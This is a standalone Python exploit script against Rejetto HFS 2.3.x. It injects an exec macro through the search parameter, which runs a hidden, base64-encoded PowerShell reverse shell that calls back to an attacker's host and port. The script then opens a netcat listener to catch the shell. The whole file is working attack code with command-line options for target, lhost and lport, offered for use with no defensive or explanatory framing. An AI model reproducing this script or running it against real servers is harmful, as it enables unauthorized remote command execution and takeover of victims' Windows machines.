import threading
import requests
import argparse
import base64
import os

class HFS():
    def __init__(self,target,lhost,lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.url = self.check_url()
        self.execute_payload()

    def check_url(self):
        check = self.target[-1]
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def hfs_exploit(self):
        print("Sending Payload!")
        power_shell = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand "
        payload = """$client = New-Object System.Net.Sockets.TCPClient('""" + self.lhost + """',""" + self.lport + """);$stream =
        $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data =
        (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =
        $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()};$client.Close()"""

        encoded_command = base64.b64encode(payload.encode("utf-16le")).decode()
        full_payload = requests.utils.quote(power_shell + encoded_command)  

        full_url = self.url + "?search=%00{{.exec|" + full_payload + ".}}"
        requests.get(full_url)

    def rev_shell(self):
        print("Starting netcat on port " + self.lport)
        net_cat = "nc -lvnp " + self.lport
        os.system(net_cat)
    
    def execute_payload(self):
        hfs_thread = threading.Thread(target=self.hfs_exploit())
        rev_shell_thread = threading.Thread(target=self.rev_shell())

        hfs_thread.start()
        rev_shell_thread.start()

        hfs_thread.join()
        rev_shell_thread.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Rejetto HFS (HTTP File Server) 2.3.x - Remote Command Execution')

    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://hfssite.com', required=True)
    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=True)
    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)  
    args = parser.parse_args()

    try:
        HFS(args.t,args.lhost,args.lport)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()